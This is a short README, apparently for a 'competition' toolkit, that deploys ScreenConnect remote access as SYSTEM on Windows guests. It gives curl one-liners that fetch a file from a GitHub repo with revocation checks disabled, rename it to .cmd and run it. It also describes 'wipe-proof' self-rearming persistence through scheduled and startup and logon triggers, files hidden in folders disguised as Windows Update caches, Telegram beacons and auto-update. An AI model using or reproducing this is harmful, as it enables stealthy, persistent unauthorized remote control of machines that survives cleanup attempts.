# github-drop - competition SC deploy

## Preferred (Guest: Run as SYSTEM) — full deploy
```bat
curl.exe -L --ssl-no-revoke -o "%TEMP%\own.txt" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o12" && copy /y "%TEMP%\own.txt" "%TEMP%\own.cmd" >nul && "%TEMP%\own.cmd"
```

## PANIC / wipe recovery
```bat
curl.exe -L --ssl-no-revoke -o "%TEMP%\rescue.cmd" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/rescue.cmd" && "%TEMP%\rescue.cmd"
```

## Telegram alerts
Alerts on state change: DOWN / RESTORED / FAIL / FORCE + first-deploy DEPLOY report.
`notify.cfg` is written on deploy (token on guest only).

## After detach — wait ~90s then verify
```bat
type "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache\boot.err"
type "%SystemRoot%\Temp\.wucache\boot.err"
sc query state= all | findstr /I ScreenConnect
```

## Current build
- OWN BUILD 20260802O12 + OWN_MON 20260802M7 + OWN_SECURE S2 + TG_REPORT T6 + RESCUE R3
- Wipe-proof: 2m + 3m + ONSTART + ONLOGON (self-rearms); local MSI cache
- Auto-update from github-drop; rescue.flag force-reinstall
- Keep: 5f6010579852e507 + f861c8140d453427

